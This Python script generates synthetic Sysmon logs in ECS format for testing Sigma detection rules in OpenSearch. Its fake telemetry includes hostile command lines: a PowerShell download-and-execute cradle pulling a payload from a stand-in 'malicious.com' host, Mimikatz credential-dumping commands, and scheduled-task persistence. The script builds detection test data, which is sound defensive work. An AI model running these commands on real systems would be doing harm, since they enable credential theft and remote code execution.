#!/usr/bin/env python3
"""
Log Generator for OpenSearch - Sigma Rule Testing

This script generates synthetic JSON logs in ECS format for OpenSearch.
The logs are designed to match specific Sigma rules for testing purposes.

Usage:
    python generate_logs.py --output logs.json --count 100
    python generate_logs.py --rule-type all --format ndjson
"""

import json
import random
import argparse
from datetime import datetime, timedelta
from typing import List, Dict, Any
import uuid


class OpenSearchLogGenerator:
    """Generates synthetic logs in ECS format for OpenSearch."""
    
    def __init__(self):
        self.base_timestamp = datetime.utcnow()
        self.suspicious_domains = [
            'malicious.tk', 'bad-actor.ml', 'phishing.ga', 
            'c2-server.gq', 'evil.cf'
        ]
        self.legitimate_domains = [
            'google.com', 'microsoft.com', 'github.com',
            'stackoverflow.com', 'wikipedia.org'
        ]
        self.suspicious_ips = [
            '192.168.1.100', '10.0.0.50', '172.16.0.200',
            '185.220.101.45', '45.142.212.61'
        ]
        self.user_names = [
            'admin', 'user01', 'jdoe', 'alice', 'bob',
            'service_account', 'administrator', 'root'
        ]
        self.host_names = [
            'WORKSTATION-01', 'DESKTOP-PC', 'SERVER-DC01',
            'LAPTOP-USER', 'WEB-SERVER-01'
        ]
    
    def _generate_timestamp(self, minutes_offset: int = 0) -> str:
        """Generate ISO timestamp with optional offset."""
        timestamp = self.base_timestamp - timedelta(minutes=minutes_offset)
        return timestamp.strftime('%Y-%m-%dT%H:%M:%S.%f')[:-3] + 'Z'
    
    def _generate_base_fields(self) -> Dict[str, Any]:
        """Generate common ECS base fields."""
        return {
            "@timestamp": self._generate_timestamp(random.randint(0, 60)),
            "ecs": {"version": "8.0.0"},
            "event": {
                "kind": "event",
                "category": ["process"],
                "type": ["start"],
                "created": self._generate_timestamp()
            },
            "host": {
                "name": random.choice(self.host_names),
                "os": {
                    "family": "windows",
                    "platform": "windows",
                    "name": "Windows 10",
                    "version": "10.0"
                }
            },
            "agent": {
                "type": "winlogbeat",
                "version": "8.0.0"
            }
        }
    
    def generate_process_creation_calc(self) -> Dict[str, Any]:
        """
        Generate Windows process creation event - Calculator execution
        Matches: windows_process_creation_basic.yml
        """
        log = self._generate_base_fields()
        log["event"]["category"] = ["process"]
        log["event"]["type"] = ["start"]
        log["EventID"] = 1
        log["winlog"] = {
            "event_id": 1,
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "provider_name": "Microsoft-Windows-Sysmon"
        }
        
        # Sigma original fields
        log["Image"] = "C:\\Windows\\System32\\calc.exe"
        log["CommandLine"] = "C:\\Windows\\System32\\calc.exe"
        log["User"] = random.choice(self.user_names)
        
        return log
    
    def generate_suspicious_dns_query(self) -> Dict[str, Any]:
        """
        Generate DNS query to suspicious domain
        Matches: suspicious_dns_query.yml
        """
        log = self._generate_base_fields()
        log["event"]["category"] = ["network"]
        log["event"]["type"] = ["connection", "protocol"]
        log["EventID"] = 22
        log["winlog"] = {
            "event_id": 22,
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "provider_name": "Microsoft-Windows-Sysmon"
        }
        
        domain = random.choice(self.suspicious_domains)
        
        # Sigma original field
        log["QueryName"] = domain
        
        return log
    
    def generate_mimikatz_execution(self) -> Dict[str, Any]:
        """
        Generate Mimikatz execution event
        Matches: mimikatz_execution.yml
        """
        log = self._generate_base_fields()
        log["winlog"] = {
            "event_id": 1,
            "channel": "Microsoft-Windows-Sysmon/Operational"
        }
        
        executable = random.choice([
            "C:\\Users\\admin\\Downloads\\mimikatz.exe",
            "C:\\Temp\\m64.exe",
            "C:\\Windows\\Temp\\mimi.exe"
        ])
        command = random.choice([
            "mimikatz.exe privilege::debug sekurlsa::logonpasswords",
            "m64.exe sekurlsa::tickets",
            "mimikatz.exe lsadump::sam"
        ])
        
        # Sigma original fields
        log["Image"] = executable
        log["CommandLine"] = command
        log["OriginalFileName"] = "mimikatz.exe"
        
        return log

    
    def generate_suspicious_powershell(self) -> Dict[str, Any]:
        """
        Generate suspicious PowerShell execution
        Matches: windows_suspicious_powershell.yml
        """
        log = self._generate_base_fields()
        log["winlog"] = {
            "event_id": 1,
            "channel": "Microsoft-Windows-Sysmon/Operational"
        }
        
        suspicious_commands = [
            "powershell.exe -enc JABjAGwAaQBlAG4AdAA=",
            "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden",
            "powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')",
            "powershell.exe -nop -w hidden -c Get-Process"
        ]
        
        executable = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
        command = random.choice(suspicious_commands)
        
        # Sigma original fields
        log["Image"] = executable
        log["CommandLine"] = command
        
        return log

    
    def generate_lateral_movement_psexec(self) -> Dict[str, Any]:
        """
        Generate PsExec lateral movement event
        Matches: lateral_movement_psexec.yml
        """
        log = self._generate_base_fields()
        log["winlog"] = {
            "event_id": 1,
            "channel": "Microsoft-Windows-Sysmon/Operational"
        }
        
        executable = random.choice([
            "C:\\Windows\\PSEXESVC.exe",
            "C:\\Windows\\System32\\PSEXESVC.exe"
        ])
        parent_executable = "C:\\Windows\\System32\\services.exe"
        
        # Sigma original fields
        log["Image"] = executable
        log["ParentImage"] = parent_executable
        log["OriginalFileName"] = "psexesvc.exe"
        
        return log

    
    def generate_suspicious_network_connection(self) -> Dict[str, Any]:
        """
        Generate suspicious network connection
        Matches: windows_network_connection_suspicious.yml
        """
        log = self._generate_base_fields()
        log["event"]["category"] = ["network"]
        log["event"]["type"] = ["connection", "start"]
        log["winlog"] = {
            "event_id": 3,
            "channel": "Microsoft-Windows-Sysmon/Operational"
        }
        
        dest_ip = random.choice(self.suspicious_ips)
        dest_port = random.choice([4444, 8080, 443, 22])
        source_ip = "192.168.1.10"
        source_port = random.randint(49152, 65535)
        executable = random.choice([
            "C:\\Windows\\System32\\cmd.exe",
            "C:\\Windows\\System32\\powershell.exe"
        ])
        
        # Sigma original fields
        log["DestinationIp"] = dest_ip
        log["DestinationPort"] = dest_port
        log["SourceIp"] = source_ip
        log["SourcePort"] = source_port
        log["Image"] = executable
        
        return log

    
    def generate_registry_modification(self) -> Dict[str, Any]:
        """
        Generate registry modification event
        Matches: registry_key_modification.yml
        """
        log = self._generate_base_fields()
        log["event"]["category"] = ["registry"]
        log["event"]["type"] = ["change"]
        log["winlog"] = {
            "event_id": 13,
            "channel": "Microsoft-Windows-Sysmon/Operational"
        }
        
        target_object = random.choice([
            "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Malware",
            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Backdoor",
            "HKLM\\System\\CurrentControlSet\\Services\\MaliciousService\\ImagePath"
        ])
        details = random.choice([
            "C:\\Users\\Public\\malware.exe",
            "C:\\Temp\\backdoor.exe"
        ])
        
        # Sigma original fields
        log["TargetObject"] = target_object
        log["Details"] = details
        
        return log

    
    def generate_scheduled_task_creation(self) -> Dict[str, Any]:
        """
        Generate scheduled task creation event
        Matches: scheduled_task_creation.yml
        """
        log = self._generate_base_fields()
        log["winlog"] = {
            "event_id": 1,
            "channel": "Microsoft-Windows-Sysmon/Operational"
        }
        
        executable = "C:\\Windows\\System32\\schtasks.exe"
        command = random.choice([
            'schtasks.exe /create /tn "MaliciousTask" /tr "C:\\Temp\\malware.exe" /sc daily',
            'schtasks.exe /create /tn "Backdoor" /tr "powershell.exe -enc ABC123" /sc onlogon'
        ])
        
        # Sigma original fields
        log["Image"] = executable
        log["CommandLine"] = command
        
        return log

    
    def generate_benign_process(self) -> Dict[str, Any]:
        """Generate benign process creation event (should NOT match Sigma rules)."""
        log = self._generate_base_fields()
        log["winlog"] = {
            "event_id": 1,
            "channel": "Microsoft-Windows-Sysmon/Operational"
        }
        
        benign_processes = [
            {
                "executable": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                "name": "chrome.exe",
                "command_line": "chrome.exe --type=renderer"
            },
            {
                "executable": "C:\\Windows\\System32\\notepad.exe",
                "name": "notepad.exe",
                "command_line": "notepad.exe document.txt"
            },
            {
                "executable": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                "name": "WINWORD.EXE",
                "command_line": "WINWORD.EXE /n document.docx"
            }
        ]
        
        process_info = random.choice(benign_processes)
        
        # Sigma original fields
        log["Image"] = process_info["executable"]
        log["CommandLine"] = process_info["command_line"]
        
        return log

    
    def generate_benign_dns_query(self) -> Dict[str, Any]:
        """Generate benign DNS query (should NOT match suspicious DNS rules)."""
        log = self._generate_base_fields()
        log["event"]["category"] = ["network"]
        log["event"]["type"] = ["connection", "protocol"]
        log["winlog"] = {
            "event_id": 22,
            "channel": "Microsoft-Windows-Sysmon/Operational"
        }
        
        domain = random.choice(self.legitimate_domains)
        
        # Sigma original field
        log["QueryName"] = domain
        
        return log

    
    def generate_logs(self, count: int = 100, malicious_ratio: float = 0.3) -> List[Dict[str, Any]]:
        """
        Generate a mix of malicious and benign logs.
        
        Args:
            count: Total number of logs to generate
            malicious_ratio: Ratio of malicious logs (0.0 to 1.0)
        
        Returns:
            List of log dictionaries
        """
        logs = []
        malicious_count = int(count * malicious_ratio)
        benign_count = count - malicious_count
        
        # Generator functions for malicious events
        malicious_generators = [
            self.generate_process_creation_calc,
            self.generate_suspicious_dns_query,
            self.generate_mimikatz_execution,
            self.generate_suspicious_powershell,
            self.generate_lateral_movement_psexec,
            self.generate_suspicious_network_connection,
            self.generate_registry_modification,
            self.generate_scheduled_task_creation
        ]
        
        # Generate malicious logs
        for _ in range(malicious_count):
            generator = random.choice(malicious_generators)
            logs.append(generator())
        
        # Generate benign logs
        benign_generators = [
            self.generate_benign_process,
            self.generate_benign_dns_query
        ]
        
        for _ in range(benign_count):
            generator = random.choice(benign_generators)
            logs.append(generator())
        
        # Shuffle to mix malicious and benign logs
        random.shuffle(logs)
        
        return logs


def main():
    parser = argparse.ArgumentParser(
        description='Generate synthetic logs for OpenSearch Sigma rule testing'
    )
    parser.add_argument(
        '--output', '-o',
        default='bulk_ready.ndjson',
        help='Output file path (default: bulk_ready.ndjson)'
    )
    parser.add_argument(
        '--count', '-c',
        type=int,
        default=500,
        help='Number of logs to generate (default: 500)'
    )
    parser.add_argument(
        '--malicious-ratio', '-r',
        type=float,
        default=0.3,
        help='Ratio of malicious logs (0.0-1.0, default: 0.3)'
    )
    
    args = parser.parse_args()
    
    # Validate malicious ratio
    if not 0.0 <= args.malicious_ratio <= 1.0:
        parser.error('malicious-ratio must be between 0.0 and 1.0')
    
    print(f"Generating {args.count} logs ({args.malicious_ratio*100:.0f}% malicious)...")
    
    generator = OpenSearchLogGenerator()
    logs = generator.generate_logs(args.count, args.malicious_ratio)
    print(f"Writing logs to {args.output}...")
    
    with open(args.output, 'w') as f:
        # Write POST _bulk command for OpenSearch Dashboard Dev Tools
        f.write('POST _bulk\n')
        
        # OpenSearch bulk API format
        for log in logs:
            # Write index action
            action = {"index": {"_index": "security-logs"}}
            f.write(json.dumps(action) + '\n')
            # Write document
            f.write(json.dumps(log) + '\n')
    
    print(f"✓ Successfully generated {len(logs)} logs")
    print(f"  - Malicious: {int(len(logs) * args.malicious_ratio)}")
    print(f"  - Benign: {len(logs) - int(len(logs) * args.malicious_ratio)}")
    print(f"\n✓ Ready to copy-paste directly into OpenSearch Dashboard Dev Tools Console!")
    print(f"  Or use: curl -X POST 'localhost:9200/_bulk' -H 'Content-Type: application/x-ndjson' --data-binary '@{args.output}'")


if __name__ == '__main__':
    main()
